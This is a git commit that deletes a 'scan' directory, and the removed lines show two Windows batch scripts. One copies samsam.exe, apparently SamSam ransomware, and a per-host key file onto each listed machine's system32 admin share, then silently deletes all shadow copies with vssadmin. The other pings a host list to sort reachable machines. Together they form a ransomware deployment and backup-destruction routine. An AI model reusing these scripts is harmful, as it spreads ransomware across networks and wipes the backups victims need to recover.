876e85eceba41ea058dc86106dd40abb7efb1831
Matthew Ulm <mtju74@gmail.com>
2026-03-04 13:53:09 -0600

    Delete scan directory

--- scan/delete_shadow_copy.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-for /f "delims=" %%a in (list.txt) do copy samsam.exe
-\\%%a\C$\windows\system32 && copy %%a_PublicKey.keyxml
-\\%%a\C$\windows\system32 && vssadmin delete shadows /all /quiet
-pause
--- scan/windows.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-for /f "delims=" %%a in (list.txt) do ping -n 1 %%a >nul && (echo %%a
-ok >> ok.txt) || (echo %%a tk >> fail.txt)
-pause
